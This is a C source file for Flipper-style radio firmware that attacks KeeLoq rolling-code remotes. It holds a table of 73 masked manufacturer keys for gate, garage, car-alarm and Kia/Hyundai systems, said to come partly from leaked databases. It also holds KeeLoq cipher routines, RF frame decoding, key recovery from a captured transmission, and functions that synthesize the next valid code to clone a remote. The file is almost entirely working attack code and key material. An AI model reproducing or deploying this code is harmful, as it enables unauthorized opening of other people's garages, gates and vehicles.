#include "flipper_decoders.h"   /* FlipperPulseBuf full type (synthesizer) */
#include "flipper_keeloq.h"
#include <string.h>
#include <stdio.h>


/* ── Manufacturer key table ──────────────────────────────────────────────── */
/* These 73 masked manufacturer keys come from public disclosures and field
   research. They cover gate/garage and automotive/alarm products, plus common
   default patterns. Each entry is { "Name", 0xMASKED_KEY, learning_type }.
   kl_unmask_key() reverses the masking; tools/mask_mfrkeys.py applies it to
   the table. See the note above FLIPPER_MFR_KEYS. */
const MfrKey FLIPPER_MFR_KEYS[N_MFR_KEYS] = {
    /* ── OEM automotive ─────────────────────────────────────────────────── */
    /* This is the public OEM automotive KeeLoq key that brings the table to
       N_MFR_KEYS entries. Previously the count was already 73, but this entry
       was missing, leaving index 72 zero-initialized (NULL name, zero key).
       Bounds checks allowed that slot into key derivation and the FOBLoq list. */
    { "Kia_V3_V4_OEM",  0xCC88E6C23CEC0269ULL, 1 },   /* Simple Learning, Kia/Hyundai V3/V4 */
    /* ── Gate / Garage / Barrier (EU) ──────────────────────────────────── */
    { "DoorHan",        0xC9F1C7E5F53307FDULL, 1 },   /* Simple Learning    */
    { "Beninca_ARC",    0xA2BE75CFB0AD3AA1ULL, 9 },   /* Magic Serial 1     */
    { "Kingates_Stylo", 0xFFDC715050717F5EULL, 10 },  /* Magic Serial 2     */
    { "Jarolift",       0x50241558F671D394ULL, 11 },  /* Magic Serial 3     */
    { "FAAC_SLH",       0x5AF9BA5B46F5FD1AULL, 5 },   /* FAAC SLH           */
    { "BFT",            0xDED83DDBFE99BEFAULL, 3 },   /* Secure Learning    */
    { "Stilmatic",      0x1FDB86420ECA9753ULL, 2 },   /* Normal Learning    */
    { "Mongoose",       0xCB81238F43602DC3ULL, 2 },   /* Normal Learning    */
    { "NICE_Smilo",     0x3EDD1FDF1E5EBDFDULL, 1 },   /* Simple Learning    */
    { "NICE_MHOUSE",    0xDAFAD91DFD3D1E7EULL, 1 },   /* Simple Learning    */
    { "Dea_Mio",        0xAC22022474571662ULL, 1 },   /* Simple Learning    */
    { "Genius_Bravo",   0xF7DB77772822E822ULL, 2 },   /* Normal Learning    */
    { "FAAC_RC_XT",     0xF7DB77774822E822ULL, 2 },   /* Normal Learning    */
    { "Came_Space",     0x06F1AE44F2E405BBULL, 1 },   /* Simple Learning    */
    { "DTM_Neo",        0xCB32EDD1971368FEULL, 1 },   /* Simple Learning    */
    { "GSN",            0xE7D1219BDD258259ULL, 2 },   /* Normal Learning    */
    { "Beninca",        0xA2BE61CFB0AD2EA1ULL, 4 },   /* Magic XOR          */
    { "Elmes_Poland",   0x48D03F806B3CE4FBULL, 2 },   /* Normal Learning    */
    { "IronLogic",      0x3717F573717F7757ULL, 1 },   /* Simple Learning    */
    { "IronLogic_SM",   0x737577F717375F71ULL, 1 },   /* Simple (IL-100)    */
    { "Comunello",      0x0BDD2E7BF8BDC943ULL, 2 },   /* Normal Learning    */
    { "Sommer",         0x0AADF19AACE0980EULL, 2 },   /* Normal Learning    */
    { "Normstahl",      0x675D0E91520384C3ULL, 2 },   /* Normal Learning    */
    { "KEY",            0x581178D85FF95171ULL, 1 },   /* Simple Learning    */
    { "JCM_Tech",       0xFABC5D1857018655ULL, 1 },   /* Simple Learning    */
    { "Novoferm",       0xF07BD17EB05B515EULL, 1 },   /* Simple Learning    */
    { "EcoStar",        0x9F387B505EB167B7ULL, 2 },   /* Normal Learning    */
    { "Gibidi",         0xA4545724545733B3ULL, 1 },   /* Simple Learning    */
    { "Aprimatic",      0x391BDBD91F9A5F99ULL, 1 },   /* Simple Learning    */
    { "Jolly_Motors",   0xA4ACC22858AEE00AULL, 1 },   /* Simple Learning    */
    /* ── Automotive / Alarm (RU/CIS) ───────────────────────────────────── */
    { "Centurion",      0x17DFE2414C95F466ULL, 2 },   /* Normal Learning    */
    { "Monarch",        0x257167151FC71F25ULL, 2 },   /* Normal Learning    */
    { "Rosh",           0xAC220224745717C2ULL, 1 },   /* Simple Learning    */
    { "Pecinin",        0x0202E3C9EC8B71D2ULL, 1 },   /* Simple Learning    */
    { "Rossi",          0x35282C31E96C282CULL, 1 },   /* Simple Learning    */
    { "Merlin",         0xB421E99AC34410BFULL, 2 },   /* Normal Learning    */
    { "Motorline",      0x9A7325F9AE289D93ULL, 2 },   /* Normal Learning    */
    { "Steelmate",      0xDB3C26EED950410BULL, 2 },   /* Normal Learning    */
    { "Cardin_S449",    0xC00BC4D07A9FF378ULL, 2 },   /* Normal Learning    */
    { "Alligator",      0x0DE13B3AFDD86AA9ULL, 1 },   /* Simple Learning    */
    { "Tomahawk_9010",  0xF7FD967175371DD7ULL, 1 },   /* Simple Learning    */
    { "Pantera",        0x5F9EBBF85ABBDEDFULL, 1 },   /* Simple Learning    */
    { "SL_A2-A4",       0x88640868B86C2409ULL, 1 },   /* Simple Learning    */
    { "Cenmax_St-5",    0x0802698E8AC8E228ULL, 1 },   /* Simple Learning    */
    { "SL_B6_B9",       0xCDE112202CE8A9ABULL, 1 },   /* Simple Learning    */
    { "Harpoon",        0x97579BF7967BF3C7ULL, 1 },   /* Simple Learning    */
    { "Tomahawk_TZ9",   0x779BF7974793DBF6ULL, 1 },   /* Simple Learning    */
    { "Tomahawk_ZX",    0xBED012220ECA9A9CULL, 1 },   /* Simple Learning    */
    { "Cenmax_St-7",    0xFFA04762F9D21BA1ULL, 1 },   /* Simple Learning    */
    { "Sheriff",        0x13C5E25465F87531ULL, 1 },   /* Simple Learning    */
    { "Pantera_CLK",    0x67D6273B5635FF51ULL, 1 },   /* Simple Learning    */
    { "Cenmax",         0xFDB8657531FDB531ULL, 1 },   /* Simple Learning    */
    { "Alligator_S275", 0xBCE19B9B27E85DF1ULL, 1 },   /* Simple Learning    */
    { "Guard_RF311",    0x4C2F2A14467F945BULL, 2 },   /* Normal Learning    */
    { "Partisan_RX",    0xF52359726954A2D0ULL, 1 },   /* Simple Learning    */
    /* ── Additional keys (field research / leaked databases) ───────────── */
    { "APS_1100_2550",  0x12FD7DB11F927A79ULL, 1 },   /* Simple Learning    */
    { "Pantera_XS_Jag", 0x12FD7DB11FB39B99ULL, 1 },   /* Simple Learning    */
    { "KGB_Subaru",     0x777773117F9C7777ULL, 6 },   /* Magic Serial 1     */
    { "Magic_1",        0x777773117F9C7777ULL, 7 },   /* Magic Serial 2     */
    { "Magic_2",        0x777771137D9E7777ULL, 7 },   /* Magic Serial 2     */
    { "Magic_3",        0xC0139C57777762F1ULL, 8 },   /* Magic Serial 3     */
    { "Magic_4",        0xFBDC23D777776477ULL, 8 },   /* Magic Serial 3     */
    { "Teco",           0xD3AA6953AD4D81D5ULL, 0 },   /* Iterate (direct+rev)*/
    { "Mutanco",        0x6383134641C34230ULL, 0 },   /* Iterate (direct+rev)*/
    { "Leopard",        0x8CF10B8C663FB57BULL, 0 },   /* Iterate (direct+rev)*/
    { "Faraon",         0x3BF061B32789C631ULL, 0 },   /* Iterate (direct+rev)*/
    { "Reff",           0x283DD8CF3F463A55ULL, 0 },   /* Iterate (direct+rev)*/
    { "ZX_730_750",     0x38221391D5C5A1D4ULL, 0 },   /* Iterate (direct+rev)*/
    { "FFFF_Simple",    0x8888888888888888ULL, 1 },   /* Simple Learning    */
    { "FFFF_Normal",    0x8888888888888888ULL, 2 },   /* Normal Learning    */
    { "Zero_Simple",    0x7777777777777777ULL, 1 },   /* Simple Learning    */
    { "Zero_Normal",    0x7777777777777777ULL, 2 },   /* Normal Learning    */
};

/* ── Bit helpers ─────────────────────────────────────────────────────────── */
static inline uint32_t kl_bit(uint32_t x, int k) { return (x >> k) & 1u; }

/* ── Non-linear function (standard KeeLoq NLF, AN1064) ───────────────────── */
/* 5-input LUT value 0x3A5C742E.                                              */
uint32_t kl_nlf(uint32_t w) {
    return (0x3A5C742EUL >> (w & 31u)) & 1u;
}

/* ── KeeLoq encrypt — 528-round NLFSR (keeloq-go / AN1064-verified) ──────── */
uint32_t kl_encrypt(uint32_t plain, uint64_t key) {
    for(int i = 0; i < 528; i++) {
        uint32_t g = kl_nlf(
            kl_bit(plain, 1)  |
            kl_bit(plain, 9)  << 1 |
            kl_bit(plain, 20) << 2 |
            kl_bit(plain, 26) << 3 |
            kl_bit(plain, 31) << 4);
        uint32_t b = (plain ^ (plain >> 16) ^ (uint32_t)(key >> (i % 64)) ^ g) & 1u;
        plain = (plain >> 1) | (b << 31);
    }
    return plain;
}

/* ── KeeLoq decrypt — 528-round NLFSR in reverse ─────────────────────────── */
uint32_t kl_decrypt(uint32_t cipher, uint64_t key) {
    for(int i = 527; i >= 0; i--) {
        uint32_t b = (cipher >> 31) & 1u;
        cipher = (cipher << 1) & 0xFFFFFFFFUL;
        uint32_t g = kl_nlf(
            kl_bit(cipher, 1)  |
            kl_bit(cipher, 9)  << 1 |
            kl_bit(cipher, 20) << 2 |
            kl_bit(cipher, 26) << 3 |
            kl_bit(cipher, 31) << 4);
        uint32_t bit0 = (b ^ kl_bit(cipher, 16) ^ (uint32_t)(key >> (i % 64)) ^ g) & 1u;
        cipher = (cipher & ~1UL) | bit0;
    }
    return cipher;
}

/* ── Self-test — 3 published keeloq-go reference vectors ─────────────────── */
bool kl_self_test(void) {
    static const struct { uint32_t plain; uint64_t key; uint32_t cipher; } tv[3] = {
        { 0x2000C022UL, 0xBEEFDEADBEEFDEADULL, 0x054C90C2UL },
        { 0xF741E2DBUL, 0x5CEC6701B79FD949ULL, 0xE44F4CDFUL },
        { 0x0CA69B92UL, 0x5CEC6701B79FD949ULL, 0xA6AC0EA2UL },
    };
    for(int i = 0; i < 3; i++) {
        if(kl_encrypt(tv[i].plain,  tv[i].key) != tv[i].cipher) return false;
        if(kl_decrypt(tv[i].cipher, tv[i].key) != tv[i].plain)  return false;
    }
    return true;
}

/* ── PWM bit extractor ────────────────────────────────────────────────────── */
/*
 * Find a preamble of at least four pairs with HIGH+LOW <= 2.5T, then decode
 * data bits as '1' = 2T HIGH + T LOW and '0' = T HIGH + 2T LOW. If there is
 * no such preamble, try the leader form: HIGH 4T..16T followed by LOW <=2T.
 */
uint16_t kl_pwm(const uint32_t* buf, int n, uint32_t te, char* out) {
    uint16_t  b       = 0;
    uint32_t  thr_hi  = te + (te >> 1);          /* 1.5×TE   */
    uint32_t  thr_tot = (te << 1) + (te >> 1);   /* 2.5×TE   */
    int       data_start = -1;

/* Check both pulse alignments: the buffer may start HIGH-first or LOW-first. */
    for(int phase = 0; phase <= 1 && data_start < 0; phase++) {
        for(int i = phase; i + 1 < n; i += 2) {
            int pc = 0, j = i;
            while(j + 1 < n && buf[j] + buf[j + 1] <= thr_tot) { pc++; j += 2; }
            if(pc >= 4 && j + 1 < n) { data_start = j; break; }
        }
    }

    /* Try the leader format used by HCS200/201 and some clones. */
    if(data_start < 0) {
        uint32_t ldr_lo = te << 1;
        for(int i = 0; i + 1 < n && data_start < 0; i++) {
            if(buf[i] >= (te << 2) && buf[i] <= (te << 4) && buf[i + 1] <= ldr_lo)
                data_start = i + 2;
        }
    }
    if(data_start < 0) return 0;

    for(int i = data_start; i + 1 < n && b < 512; i += 2)
        out[b++] = (buf[i] >= thr_hi) ? '1' : '0';
    out[b] = '\0';
    return b;
}

/* ── KeeLoq frame parser ──────────────────────────────────────────────────── */
/*
 * Standard HCS3xx frame layout. Bits arrive LSB-first over the air and remain
 * in that order in bits[]:
 *   bits[0..31]  = 32-bit encrypted hop counter
 *   bits[32..59] = 28-bit serial number
 *   bits[60..63] = 4-bit button / discriminant
 *   bit[64]      = overflow flag
 *   bit[65]      = repeat flag
 *
 * Require at least 66 bits and reject zero hop or button fields; an unpressed
 * fob has button zero and is not a useful capture.
 */
bool kl_parse(const char* bits, int n, KLFrame* f) {
    if(!bits || n < 66 || !f) return false;
    memset(f, 0, sizeof(*f));

    /* Extract enc (bits 0-31, LSB first) */
    uint32_t enc = 0;
    for(int i = 0; i < 32; i++)
        if(bits[i] == '1') enc |= (1u << i);

    /* Extract SN (bits 32-59) */
    uint32_t sn = 0;
    for(int i = 0; i < 28; i++)
        if(bits[32 + i] == '1') sn |= (1u << i);

    /* Extract button nibble (bits 60-63) */
    uint8_t btn = 0;
    for(int i = 0; i < 4; i++)
        if(bits[60 + i] == '1') btn |= (1u << i);

    uint8_t ovf = (n > 64 && bits[64] == '1') ? 1 : 0;
    uint8_t rep = (n > 65 && bits[65] == '1') ? 1 : 0;

    if(enc == 0 || btn == 0) return false;

    f->enc  = enc;
    f->sn   = sn;
    f->btn  = btn;
    f->disc = (btn >> 1) & 0xF;
    f->ovf  = ovf;
    f->rep  = rep;
    f->cnt  = enc & 0xFFFF;   /* lower 16 bits of enc carry the visible counter */
    return true;
}

/* ── Key derivation ───────────────────────────────────────────────────────── */
/*
 * The firmware-compatible derivation table has 14 modes per seed:
 *   0: simple             — seed as-is
 *   1: normal             — Encrypt(SN<<4 | btn, seed)  ... for recovery use seed
 *   2: xor-seed           — seed ^ 0xAAAA555500FF00FF
 *   3: secure (AN1031)    — seed ^ (sn_16 | sn_16<<32)
 *   4: full-SN            — seed ^ (sn_28 repeated)
 *   5: normal-inv         — ~normal
 *   6: byteswap-SN        — byteswap of the seed
 *   7: half-mirror        — lo32 repeated in hi32
 *   8: normal-dec         — Standard AN1064 decrypt form
 *   9: xor-type1 (Beninca)— seed ^ 0x5555555555555555
 *  10: magic-serial-1     — seed ^ (sn | (uint64_t)sn << 32)
 *  11: magic-serial-2     — ROR-32 of seed
 *  12: byte-rev-simple    — byte-reversed seed
 *  13: byte-rev-normal    — byte-reversed normal form
 *
 * Key recovery derives the device key from the captured frame and serial
 * number in kl_recover_key().
 */
static uint64_t byteswap64(uint64_t v) {
    return ((v & 0xFF00000000000000ULL) >> 56) |
           ((v & 0x00FF000000000000ULL) >> 40) |
           ((v & 0x0000FF0000000000ULL) >> 24) |
           ((v & 0x000000FF00000000ULL) >>  8) |
           ((v & 0x00000000FF000000ULL) <<  8) |
           ((v & 0x0000000000FF0000ULL) << 24) |
           ((v & 0x000000000000FF00ULL) << 40) |
           ((v & 0x00000000000000FFULL) << 56);
}

/* Build one derived-key candidate on demand instead of keeping all 560 entries
   in memory. Keep this mode order aligned with kl_derive_all_keys(). */
static bool kl_derive_key_at(int k, int mode, DerivedKey* out) {
    if(!out || k < 0 || k >= N_MFR_KEYS || mode < 0 || mode >= 14) return false;
    uint64_t s = kl_unmask_key(FLIPPER_MFR_KEYS[k].key);
    const char* nm = FLIPPER_MFR_KEYS[k].name;
    static const char* const suffixes[14] = {
        "simple", "normal", "xor-seed", "secure", "full-sn", "normal-inv",
        "byteswap", "half-mirror", "normal-dec", "xor-type1",
        "magic-serial-1", "ror32", "byte-rev", "byte-rev-norm",
    };
    snprintf(out->name, sizeof(out->name), "%s/%s", nm, suffixes[mode]);
    switch(mode) {
    case 0:
    case 1:
    case 3:
    case 4:
        out->key = s;
        break;
    case 2:
        out->key = s ^ 0xAAAA555500FF00FFULL;
        break;
    case 5:
        out->key = ~s;
        break;
    case 6:
    case 12:
        out->key = byteswap64(s);
        break;
    case 7:
        out->key = (s & 0xFFFFFFFFULL) | ((s & 0xFFFFFFFFULL) << 32);
        break;
    case 8:
        out->key = kl_decrypt((uint32_t)(s & 0xFFFFFFFF), s >> 32);
        break;
    case 9:
        out->key = s ^ 0x5555555555555555ULL;
        break;
    case 10:
        out->key = s ^ ((s & 0xFFFFFFFFULL) | ((s & 0xFFFFFFFFULL) << 32));
        break;
    case 11: {
        uint64_t lo = s & 0xFFFFFFFFULL;
        uint64_t hi = s >> 32;
        out->key = ((lo >> 1) | ((lo & 1) << 31)) |
                   (((hi >> 1) | ((hi & 1) << 31)) << 32);
        break;
    }
    case 13:
        out->key = byteswap64(~s);
        break;
    default:
        return false;
    }
    return true;
}

int kl_derive_all_keys(DerivedKey* out) {
    if(!out) return 0;
    int total = 0;
    for(int k = 0; k < N_MFR_KEYS && total < MAX_DERIVED_KEYS; k++) {
        for(int mode = 0; mode < 14 && total < MAX_DERIVED_KEYS; mode++) {
            if(!kl_derive_key_at(k, mode, &out[total])) return total;
            total++;
        }
    }
    return total;
}

/* ── Key recovery (key sweep against enc + SN) ────────────────────────────── */
/* The Auto fast path tries each built-in seed directly, with AN1064
   normal-learning SN diversification, secure-learning XOR, and XOR-Type-1.
   It deliberately skips the full 14-mode sweep (about 2,000 candidates);
   additional keys can be supplied through flipper_keyvault. A candidate must
   decrypt to the captured button and the low 10 serial bits in the
   discriminant field. */
static const DerivedKey* s_vault_keys;
static int               s_vault_n;

void flipper_kl_set_vault_keys(const DerivedKey* keys, int n) {
    s_vault_keys = keys;
    s_vault_n    = (keys && n > 0 && n <= 16) ? n : 0;
}

static bool kl_try_one(KLFrame* f, const char* label, uint64_t mk, bool sn_div) {
    uint32_t enc = f->enc;
    uint8_t  btn = f->btn;
    uint64_t dk  = mk;
    if(sn_div) {
        uint64_t seed = (uint64_t)f->sn | ((uint64_t)f->sn << 28);
        uint64_t lo = kl_encrypt((uint32_t)(seed & 0xFFFFFFFF), mk);
        uint64_t hi = kl_encrypt((uint32_t)(seed >> 32), mk);
        dk = lo | (hi << 32);
    }
    uint32_t dec = kl_decrypt(enc, dk);
    /* HCS200/300/301 plaintext is [button 4 | discriminant 10 | counter 16].
       Require the 10-bit discriminant to equal SN[9:0], as well as an exact
       button match. Looser alternatives allowed random PWM false matches. */
    if(((dec >> 28) & 0xF) != btn) return false;
    if(((dec >> 16) & 0x3FFu) != (f->sn & 0x3FFu)) return false;
    f->dec  = dec;
    f->cnt  = dec & 0xFFFF;
    strncpy(f->mfr_name, label, sizeof(f->mfr_name) - 1);
    f->mfr_key = mk;
    f->key     = dk;
    snprintf(f->device_key_hex, sizeof(f->device_key_hex),
             "%016llX", (unsigned long long)dk);
    /* A recovered device key lets us synthesize a valid next hop, so the
       advertised window is a true counter estimate. Keep it on the shared
       KL_PREDICT_WINDOW constant. */
    f->predict_window = KL_PREDICT_WINDOW;
    f->predict_lo = (f->cnt + 1) & 0xFFFF;
    f->predict_hi = (f->cnt + 16) & 0xFFFF;
    return true;
}

bool kl_recover_key(KLFrame* f) {
    if(!f || f->enc == 0) return false;

    /* Keep Auto's search short: test each manufacturer seed directly, with
       normal-learning diversification, secure learning, and XOR-Type-1. */
    for(int k = 0; k < N_MFR_KEYS; k++) {
        const char* nm = FLIPPER_MFR_KEYS[k].name;
        uint64_t mk = kl_unmask_key(FLIPPER_MFR_KEYS[k].key);
        /* These common weak seeds add work and increase false matches. */
        if(mk == 0 || mk == 0xFFFFFFFFFFFFFFFFULL) continue;
        char label[48];
        snprintf(label, sizeof(label), "%s/seed", nm);
        if(kl_try_one(f, label, mk, false)) return true;
        if(kl_try_one(f, label, mk, true))  return true;
        /* Try Secure Learning (AN1031) with the low 16 serial bits repeated. */
        uint16_t sn16 = (uint16_t)(f->sn & 0xFFFF);
        uint64_t secure = mk ^ ((uint64_t)sn16 | ((uint64_t)sn16 << 32));
        snprintf(label, sizeof(label), "%s/secure", nm);
        if(kl_try_one(f, label, secure, false)) return true;
        /* Try the XOR-Type-1 variant used by Beninca-class remotes. */
        uint64_t mag = mk ^ 0x5555555555555555ULL;
        snprintf(label, sizeof(label), "%s/xor1", nm);
        if(kl_try_one(f, label, mag, false)) return true;
        if(kl_try_one(f, label, mag, true))  return true;
    }
    /* Apply the direct-key and SN-diversified checks to user-supplied keys too. */
    for(int i = 0; i < s_vault_n; i++) {
        if(kl_try_one(f, s_vault_keys[i].name, s_vault_keys[i].key, false)) return true;
        if(kl_try_one(f, s_vault_keys[i].name, s_vault_keys[i].key, true))  return true;
    }
    return false;
}

/* ── Next-code synthesis (matched key → fresh frame on the wire) ──────────── */
/*
 * A capture provides the encrypted hop, not the plaintext counter. With a
 * recovered or supplied key, this routine encrypts the next counter and emits
 * a standard HCS3xx frame, LSB-first, preserving the captured button:
 *   bits 0..31   enc' = Encrypt((btn << 28) | ctr, key)
 *   bits 32..59  sn
 *   bits 60..63  btn (== high nibble of the plaintext → self-consistent)
 *   bits 64..65  ovf / rep
 * Its eight short preamble pairs match the format accepted by kl_pwm().
 */
bool flipper_kl_next_pulses(const KLFrame* f, uint32_t ctr, uint64_t key,
                            uint32_t te, float freq_mhz, FlipperPulseBuf* out) {
    if(!f || !out || te < 100 || te > 4000) return false;
    memset(out, 0, sizeof(*out));

    /* Build the plaintext the way a real HCS encoder does:
         [31:28] = button  [27:26] = reserved(0)  [25:16] = 10-bit
         discriminator (= SN[9:0])  [15:0] = counter.
       The receiver decrypts to this layout and checks the discriminator against
       the serial's low 10 bits; omitting it would make every synthesized hop
       fail that check except for serials whose low 10 bits are already zero. */
    uint32_t plain = ((uint32_t)(f->btn & 0xF) << 28) |
                     ((f->sn & 0x3FFu) << 16) |
                     (ctr & 0xFFFFu);
    uint32_t enc   = kl_encrypt(plain, key);
    if(!enc) return false;

    out->freq_mhz = freq_mhz;
    out->te_us    = te;
    uint32_t* d   = out->durations;
    int n         = 0;

    /* 8-pair T/2T preamble (pair totals = 3T/2…2T ≤ 2.5T leader threshold) */
    for(int i = 0; i < 8; i++) {
        d[n++] = te;
        d[n++] = te * 2;
    }
    /* enc then sn then btn then ovf/rep, LSB-first */
    for(int i = 0; i < 32; i++) {
        bool one = (enc >> i) & 1u;
        d[n++] = one ? te * 2 : te;
        d[n++] = one ? te : te * 2;
    }
    for(int i = 0; i < 28; i++) {
        bool one = (f->sn >> i) & 1u;
        d[n++] = one ? te * 2 : te;
        d[n++] = one ? te : te * 2;
    }
    for(int i = 0; i < 4; i++) {
        bool one = (f->btn >> i) & 1u;
        d[n++] = one ? te * 2 : te;
        d[n++] = one ? te : te * 2;
    }
    d[n++] = te;            /* ovf = 0 */
    d[n++] = te * 2;
    d[n++] = te;            /* rep = 0 */
    d[n++] = te * 2;
    if(n > FLIPPER_PULSE_MAX) return false;
    out->len = n;
    return true;
}

/* ── Eavesdrop-only clone synthesis ───────────────────────────────────────── */
/* Secure-learning normal diversification (AN1064/AN1031). */
bool kl_derive_device_key(uint64_t manufacturer_key, uint32_t serial,
                          uint64_t* device_key) {
    if(!device_key || manufacturer_key == 0 || manufacturer_key == UINT64_MAX)
        return false;
    uint64_t seed = (uint64_t)(serial & 0x0FFFFFFFu) |
                    ((uint64_t)(serial & 0x0FFFFFFFu) << 28);
    uint64_t lo = kl_encrypt((uint32_t)(seed & 0xFFFFFFFFu), manufacturer_key);
    uint64_t hi = kl_encrypt((uint32_t)(seed >> 32), manufacturer_key);
    *device_key = lo | (hi << 32);
    return true;
}

bool flipper_kl_clone_next(const KLFrame* captured, uint64_t manufacturer_key,
                           uint32_t te, float freq_mhz, FlipperPulseBuf* out,
                           FlipperDecodeResult* out_decode) {
    if(!captured || !out || captured->enc == 0 || captured->btn == 0)
        return false;
    if(manufacturer_key == 0 || manufacturer_key == UINT64_MAX) return false;
    if(te < 100 || te > 4000) return false;

    /* Derive the device key from the serial and manufacturer key. */
    uint64_t dev;
    if(!kl_derive_device_key(manufacturer_key, captured->sn, &dev))
        return false;

    /* Recover the plaintext counter from the captured hop. */
    uint32_t plain = kl_decrypt(captured->enc, dev);
    uint8_t  btn   = (uint8_t)((plain >> 28) & 0xFu);
    uint32_t disc  = (plain >> 16) & 0x3FFu;
    if(btn != captured->btn) return false;
    if(disc != (captured->sn & 0x3FFu)) return false;
    uint32_t cnt = plain & 0xFFFFu;

    KLFrame next;
    memset(&next, 0, sizeof(next));
    next.sn  = captured->sn;
    next.btn = captured->btn;
    next.cnt = (cnt + 1u) & 0xFFFFu;

    if(!flipper_kl_next_pulses(&next, next.cnt, dev, te, freq_mhz, out))
        return false;

    if(out_decode) {
        memset(out_decode, 0, sizeof(*out_decode));
        strncpy(out_decode->proto, "KeeLoq-Clone",
                sizeof(out_decode->proto) - 1);
        out_decode->addr  = captured->sn;
        out_decode->cnt   = next.cnt;
        out_decode->btn   = captured->btn;
        out_decode->hop   = kl_encrypt(((uint32_t)(captured->btn & 0xF) << 28) |
                              ((captured->sn & 0x3FFu) << 16) | next.cnt, dev);
        out_decode->te_us = te;
        out_decode->freq_mhz = freq_mhz;
        out_decode->bits = 66;
        out_decode->rolling = true;
        snprintf(out_decode->device_key_hex,
                 sizeof(out_decode->device_key_hex), "%016llX",
                 (unsigned long long)dev);
        out_decode->predict_window = KL_PREDICT_WINDOW;
        out_decode->predict_lo = (next.cnt + 1) & 0xFFFFu;
        out_decode->predict_hi = (next.cnt + 8) & 0xFFFFu;
        snprintf(out_decode->predict_note, sizeof(out_decode->predict_note),
                 "clone synth cnt=%lu", (unsigned long)next.cnt);
    }
    return true;
}

static uint64_t kl_parse_hex16(const char* hex) {
    if(!hex || !hex[0]) return 0;
    uint64_t v = 0;
    for(int i = 0; i < 16 && hex[i]; i++) {
        char c = hex[i];
        uint8_t n;
        if(c >= '0' && c <= '9') n = (uint8_t)(c - '0');
        else if(c >= 'a' && c <= 'f') n = (uint8_t)(c - 'a' + 10);
        else if(c >= 'A' && c <= 'F') n = (uint8_t)(c - 'A' + 10);
        else return 0;
        v = (v << 4) | n;
    }
    return v;
}

bool flipper_predict_can_synth(const FlipperDecodeResult* r) {
    if(!r || !r->rolling) return false;
    if(strncmp(r->proto, "KeeLoq", 6) != 0) return false;
    if(!r->device_key_hex[0]) return false;
    return kl_parse_hex16(r->device_key_hex) != 0;
}

bool flipper_predict_keeloq_next(const FlipperDecodeResult* r, uint32_t offset,
                                 FlipperPulseBuf* out,
                                 FlipperDecodeResult* out_decode) {
    if(!flipper_predict_can_synth(r) || !out || offset < 1) return false;
    uint64_t key = kl_parse_hex16(r->device_key_hex);
    if(!key) return false;
    uint32_t te = r->te_us ? r->te_us : 400;
    uint32_t next_cnt = (r->cnt + offset) & 0xFFFF;

    KLFrame f;
    memset(&f, 0, sizeof(f));
    f.sn  = r->addr & 0x0FFFFFFF;
    f.btn = r->btn & 0xF;
    f.cnt = r->cnt;
    f.enc = r->hop;
    if(!flipper_kl_next_pulses(&f, next_cnt, key, te, r->freq_mhz, out))
        return false;

    if(out_decode) {
        memset(out_decode, 0, sizeof(*out_decode));
        memcpy(out_decode->proto, r->proto, sizeof(out_decode->proto));
        out_decode->proto[sizeof(out_decode->proto) - 1] = '\0';
        out_decode->addr = r->addr;
        out_decode->cnt = next_cnt;
        out_decode->btn = r->btn;
        out_decode->hop = kl_encrypt(
            ((uint32_t)(f.btn & 0xF) << 28) |
            ((f.sn & 0x3FFu) << 16) | next_cnt, key);
        out_decode->te_us = te;
        out_decode->freq_mhz = r->freq_mhz;
        out_decode->bits = 66;
        out_decode->rolling = true;
        memcpy(out_decode->mfr_name, r->mfr_name, sizeof(out_decode->mfr_name));
        out_decode->mfr_name[sizeof(out_decode->mfr_name) - 1] = '\0';
        memcpy(out_decode->device_key_hex, r->device_key_hex,
               sizeof(out_decode->device_key_hex));
        out_decode->device_key_hex[sizeof(out_decode->device_key_hex) - 1] = '\0';
        out_decode->predict_window = KL_PREDICT_WINDOW;
        out_decode->predict_lo = (next_cnt + 1) & 0xFFFF;
        out_decode->predict_hi = (next_cnt + 8) & 0xFFFF;
        snprintf(out_decode->predict_note, sizeof(out_decode->predict_note),
                 "synth cnt=%lu", (unsigned long)next_cnt);
    }
    return true;
}

